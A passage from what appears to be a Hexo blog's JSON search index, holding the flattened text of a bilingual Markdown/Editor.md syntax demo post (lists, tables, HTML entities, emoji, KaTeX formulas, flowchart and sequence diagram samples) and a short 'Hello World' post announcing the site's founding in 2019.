列表二-1 列表二-2 列表二-3 列表三 列表一 列表二 列表三 有序列表 Ordered Lists (-) 第一行 第二行 第三行 GFM task list GFM task list 1 GFM task list 2 GFM task list 3 GFM task list 3-1 GFM task list 3-2 GFM task list 3-3 GFM task list 4 GFM task list 4-1 GFM task list 4-2 绘制表格 Tables 项目 价格 数量 计算机 $1600 5 手机 $12 12 管线 $1 234 First Header Second Header Content Cell Content Cell Content Cell Content Cell First Header Second Header Content Cell Content Cell Content Cell Content Cell Function name Description help() Display the help window. destroy() Destroy your computer! Left-Aligned Center Aligned Right Aligned col 3 is some wordy text $1600 col 2 is centered $12 zebra stripes are neat $1 Item Value Computer $1600 Phone $12 Pipe $1 特殊符号 HTML Entities Codes&copy; &amp; &uml; &trade; &iexcl; &pound;&amp; &lt; &gt; &yen; &euro; &reg; &plusmn; &para; &sect; &brvbar; &macr; &laquo; &middot; X&sup2; Y&sup3; &frac34; &frac14; &times; &divide; &raquo; 18&ordm;C &quot; &apos; [========] Emoji表情 :smiley: Blockquotes :star: GFM task lists &amp; Emoji &amp; fontAwesome icon emoji &amp; editormd logo emoji :editormd-logo-5x: :smiley: @mentions, :smiley: #refs, links, formatting, and tags supported :editormd-logo:; list syntax required (any unordered or ordered list supported) :editormd-logo-3x:; [ ] :smiley: this is a complete item :smiley:; []this is an incomplete item test link :fa-star: @pandao; [ ]this is an incomplete item :fa-star: :fa-gear:; :smiley: this is an incomplete item test link :fa-star: :fa-gear:; :smiley: this is :fa-star: :fa-gear: an incomplete item test link; 反斜杠 Escape*literal asterisks* [========] 科学公式 TeX(KaTeX)$$E=mc^2$$ 行内的公式$$E=mc^2$$行内的公式，行内的$$E=mc^2$$公式。 $$x &gt; y$$ $$(\\sqrt{3x-1}+(1+x)^2)$$ $$\\sin(\\alpha)^{\\theta}=\\sum_{i=0}^{n}(x^i + \\cos(f))$$ 多行公式： \\displaystyle \\left( \\sum\\_{k=1}^n a\\_k b\\_k \\right)^2 \\leq \\left( \\sum\\_{k=1}^n a\\_k^2 \\right) \\left( \\sum\\_{k=1}^n b\\_k^2 \\right) \\displaystyle \\frac{1}{ \\Bigl(\\sqrt{\\phi \\sqrt{5}}-\\phi\\Bigr) e^{ \\frac25 \\pi}} = 1+\\frac{e^{-2\\pi}} {1+\\frac{e^{-4\\pi}} { 1+\\frac{e^{-6\\pi}} {1+\\frac{e^{-8\\pi}} {1+\\cdots} } } } f(x) = \\int_{-\\infty}^\\infty \\hat f(\\xi)\\,e^{2 \\pi i \\xi x} \\,d\\xi 分页符 Page break Print Test: Ctrl + P [========] 绘制流程图 Flowchartst=&gt;start: 用户登陆 op=&gt;operation: 登陆操作 cond=&gt;condition: 登陆成功 Yes or No? e=&gt;end: 进入后台 st-&gt;op-&gt;cond cond(yes)-&gt;e cond(no)-&gt;op [========] 绘制序列图 Sequence DiagramAndrew-&gt;China: Says Hello Note right of China: China thinks\\nabout it China--&gt;Andrew: How are you? Andrew-&gt;&gt;China: I am good thanks! End","tags":[{"name":"markdown","slug":"markdown","permalink":"https://www.unkaer.cf/tags/markdown/"}]},{"title":"Hello World","date":"2019-12-29T16:00:00.000Z","path":"hello-world.html","text":"本站于2019-12-30成立 感谢感谢互联网提供的免费学习平台建立本站所用的知识全是来自互联网上的学习 本网站网站使用Hexo搭建主题基于BlueLake修改风格模仿穗乃果 の 小窝托管于Github 再次感谢🎉🎉🎉🎉🎉","tags":[]}]